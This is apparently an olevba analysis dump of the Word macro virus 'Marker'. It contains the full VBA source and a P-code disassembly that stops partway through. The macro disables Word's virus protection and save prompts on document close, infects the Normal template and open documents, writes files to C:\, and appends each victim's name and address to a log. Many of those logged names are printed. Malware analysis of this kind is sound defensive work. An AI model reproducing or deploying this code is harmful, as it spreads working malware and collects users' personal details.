olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.em
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.em - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - ñðåäà, 3 ìàé 2000
' Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - âòîðíèê, 16 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - ÷åòâåðã, 18 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:08:22 - ïîíåäåëüíèê, 22 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:24:11 - ïîíåäåëüíèê, 22 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:26:03 - ïîíåäåëüíèê, 22 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:34:43 - âòîðíèê, 23 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:45:43 - ÷åòâåðã, 25 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:44:22 - ÷åòâåðã, 25 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:24:54 - ÷åòâåðã, 25 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:19:12 - âîñêðåñåíüå, 28 ìàé 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:13:51 - ïîíåäåëüíèê, 29 ìàé 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:54:24 - ïîíåäåëüíèê, 29 ìàé 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:46:56 - âòîðíèê, 30 ìàé 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:46:19 - âòîðíèê, 30 ìàé 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:23:20 - ÷åòâåðã, 1 èþí 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:33:29 - ÷åòâåðã, 1 èþí 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 00:50:38 - âòîðíèê, 6 èþí 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:07:44 - âòîðíèê, 6 èþí 2000
' Ìàóëü Ñåðãåé Âàñèëüåâè÷
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:37:58 - ñóááîòà, 17 èþí 2000
' Mike
' Jhuma
' Shibrampur
' Burichang
' Comilla



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:10 - ñóááîòà, 17 èþí 2000
' Mike
' Jhuma
' Shibrampur
' Burichang
' Comilla



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:05:05 - Tuesday, 8 Aug 2000
' Righard J. Zwienenberg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:06 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:19 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:26 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:32 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:39 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:29:46 - Tuesday, 8 Aug 2000
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:07:03 - Freitag, 12 Okt 2001
' Andreas Marx
'


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.em
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 20485 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #1:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #7:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #9:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #14:
' Line #15:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #16:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #17:
' Line #18:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' Line #23:
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' Line #26:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #28:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #33:
' Line #34:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #35:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #36:
' Line #37:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #40:
' Line #41:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #53:
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' Line #57:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #58:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #59:
' Line #60:
' Line #61:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #62:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #63:
' Line #64:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #65:
' Line #66:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #67:
' Line #68:
' Line #69:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #71:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #73:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' Line #80:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #81:
' Line #82:
' Line #83:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #84:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #85:
' Line #86:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #87:
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' Line #91:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #92:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #93:
' Line #94:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #95:
' Line #96:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #99:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #100:
' Line #101:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #102:
' Line #103:
' 	EndIfBlock 
' Line #104:
' Line #105:
' Line #106:
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #113:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #114:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #115:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - ñðåäà, 3 ìàé 2000"
' Line #116:
' 	QuoteRem 0x0000 0x001E " Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #122:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #123:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #124:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000"
' Line #125:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #126:
' 	QuoteRem 0x0000 0x0000 ""
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #131:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #132:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #133:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000"
' Line #134:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #140:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #141:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #142:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - âòîðíèê, 16 ìàé 2000"
' Line #143:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #144:
' 	QuoteRem 0x0000 0x0000 ""
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #149:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #150:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #151:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - ñðåäà, 17 ìàé 2000"
' Line #152:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #158:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #159:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #160:
